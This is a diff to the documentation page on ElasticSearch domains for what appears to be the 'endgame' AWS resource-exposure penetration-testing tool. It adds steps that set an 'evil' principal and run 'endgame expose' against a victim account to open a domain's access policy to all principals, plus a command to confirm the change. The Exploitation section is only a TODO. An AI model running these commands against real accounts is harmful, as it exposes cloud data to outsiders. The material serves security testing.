@@ -1,10 +1,32 @@
 # ElasticSearch Domains
 
+* [Steps to Reproduce](#steps-to-reproduce)
+* [Exploitation](#exploitation)
+* [Remediation](#remediation)
+* [Basic Detection](#basic-detection)
+* [References](#references)
+
 > Note: The **Network Configuration** settings in ElasticSearch clusters offer two options - **VPC Access** or **Public access**. If VPC access is used, modification of the resource-based policy - whether using `endgame` or the CLI exploitation method - will not result in access to the internet. `endgame` only modifies the resource-based policy for the ElasticSearch cluster, so this will only expose ElasticSearch clusters that are set to **Public access*.
 
 ## Steps to Reproduce
 
+* To expose the resource using `endgame`, run the following from the victim account:
+
+```bash
+export EVIL_PRINCIPAL=arn:aws:iam::999988887777:user/evil
+
+endgame expose --service elasticsearch --name test-resource-exposure
+```
+
+* To get the content of the resource-based policy for ElasticSearch domain config, run the following command from the victim account:
+
+```bash
+aws es describe-elasticsearch-domain-config --domain-name test-resource-exposure
+```
+
 ## Example
+
+The response will contain a field titled `AccessPolicies`. AccessPolicies will contain content that resembles the below. Observe that the victim resource (`arn:aws:es:us-east-1:999988887777:domain/test-resource-exposure`) allows access to `*` principals, indicating a successful compromise.
 
 ```json
 {
@@ -23,6 +45,10 @@
 ```
 
 ## Exploitation
+
+```
+TODO
+```
 
 ## Remediation
 
